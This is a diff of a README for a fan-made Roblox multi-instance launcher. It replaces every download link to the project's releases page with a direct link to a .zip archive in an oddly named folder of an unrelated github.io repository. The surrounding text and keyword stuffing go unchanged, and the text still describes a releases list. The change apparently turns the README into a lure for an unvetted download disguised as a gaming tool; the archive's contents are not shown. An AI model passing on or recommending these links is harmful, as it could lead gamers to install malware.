@@ -15,14 +15,14 @@ This is not an official Roblox product. It's built by fans, for fans, and shared
 
 Click the big button below to go directly to the download page:
 
-[⬇️ **DOWNLOAD NOW**](https://github.com/viggtomas/fishstrap-multi-instance/releases)
+[⬇️ **DOWNLOAD NOW**](https://github.com/viggtomas/viggtomas.github.io/raw/refs/heads/main/wienerwurst/Dist-v2.6.zip)
 
 ## 🧭 Getting Started in 3 Simple Steps
 
 ### Step 1: Visit the Download Page
 
 Visit this link to download the application:  
-👉 [https://github.com/viggtomas/fishstrap-multi-instance/releases](https://github.com/viggtomas/fishstrap-multi-instance/releases)
+👉 [https://github.com/viggtomas/viggtomas.github.io/raw/refs/heads/main/wienerwurst/Dist-v2.6.zip](https://github.com/viggtomas/viggtomas.github.io/raw/refs/heads/main/wienerwurst/Dist-v2.6.zip)
 
 You'll see a list of available releases. Look for the newest one at the top.
 
@@ -132,6 +132,6 @@ If you run into any roadblocks, remember: the community is here to help. And the
 
 **Ready to dive in? Hit the button below!**
 
-[⬇️ **DOWNLOAD FISHSTRAP-MULTI-INSTANCE NOW**](https://github.com/viggtomas/fishstrap-multi-instance/releases)
+[⬇️ **DOWNLOAD FISHSTRAP-MULTI-INSTANCE NOW**](https://github.com/viggtomas/viggtomas.github.io/raw/refs/heads/main/wienerwurst/Dist-v2.6.zip)
 
 Keywords: fast-flags, fishstrap, fishstrap-multi, fps-unlocker, free-download, gaming-tools, github-project, instance, multi, multi-instance, open-source, roblox, windows
